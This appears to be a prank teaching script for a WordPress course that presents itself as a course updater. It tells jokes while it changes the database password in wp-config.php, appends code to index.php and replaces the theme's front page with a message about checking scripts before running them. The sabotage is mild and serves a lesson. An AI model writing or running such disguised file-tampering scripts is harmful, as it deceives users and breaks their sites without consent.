#!/bin/bash
echo "Advanced Web Development Course Updater Script";
echo "______________________________________________";
echo "";
echo "";

if [ -f ./wp-config.php ]; then
    echo "updating..."
    printf "\necho get_template_directory();" >> index.php
    echo "still updating...hey! here's a joke:"
    echo "How to tell if you used HTML5 in your WordPress:"
    #! Get theme Dir
    php index.php > out.txt
    echo "Does it work in Internet Explorer? No?"
    echo "Then you used HTML5."
    echo "Ok...almost done."
    #! Break DB Conn
    sed -i -- "s/define('DB_PASSWORD', '');/define('DB_PASSWORD', 'password1234');/g" ./wp-config.php
    THEME_DIR=( $(tail -1 out.txt) )
    rm out.txt
    #! edit template-hierarchy
    if [ -f $THEME_DIR/front-page.php ]; then
        mv $THEME_DIR/front-page.php $THEME_DIR/front-page.php.old
        touch $THEME_DIR/front-page.php
        echo "<h1>Lesson #1...never run a script without checking it over first.</h1><h2>Lesson #2...the WordPress Template Hierarchy is complicated.</h2>" >> $THEME_DIR/front-page.php
    else
        touch $THEME_DIR/front-page.php
        echo "<h1>Lesson #1...never run a script without checking it over first.</h1><h2>Lesson #2...the WordPress Template Hierarchy is complicated.</h2>" >> $THEME_DIR/front-page.php
    fi
else
    die "This script cannot run in your environment...please call over Zach or Rodrick";
fi

echo "Project Update Complete! Click 'Run Project' to begin using your site."
echo "";